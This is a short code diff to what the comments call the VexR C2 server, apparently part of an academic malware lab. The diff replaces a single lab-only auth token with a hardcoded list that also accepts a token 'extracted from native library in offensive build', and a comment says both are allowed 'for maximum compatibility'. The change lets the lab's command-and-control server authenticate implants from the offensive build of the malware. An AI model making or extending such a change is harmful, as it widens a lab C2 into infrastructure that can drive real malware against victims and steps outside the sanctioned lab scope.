@@ -45,9 +45,11 @@ DB_PATH = BASE_DIR / "vexr_lab.db"
 PRIVATE_KEY_PATH = BASE_DIR / "server_private.pem"
 PUBLIC_KEY_PATH = BASE_DIR / "server_public.pem"
 
-# Auth token hardcoded in the sample (decoded from InternalResolver.AUTH_BYTES).
-# Overridden for the academic lab build — see README.md.
-AUTH_TOKEN = "VexR_Lab_Academic_Token_2026"
+# Auth tokens for the VexR C2 server.
+# - Academic token: VexR_Lab_Academic_Token_2026 (used in academic builds)
+# - Offensive token: VexR_Auth_99x_2026_Secured (extracted from native library in offensive build)
+# Both tokens are accepted for maximum compatibility.
+AUTH_TOKENS = ["VexR_Auth_99x_2026_Secured", "VexR_Lab_Academic_Token_2026"]
 SUDO_PORT = "EeILBT"  # from assets/sudoport.txt
 
 # ---------------------------------------------------------------------------
@@ -271,7 +273,8 @@ def _startup() -> None:
 
 
 def _authorized(request: Request) -> bool:
-    return request.headers.get("X-Auth-Token") == AUTH_TOKEN
+    token = request.headers.get("X-Auth-Token")
+    return token in AUTH_TOKENS
 
 
 def _parse_form(body: str) -> dict[str, str]:
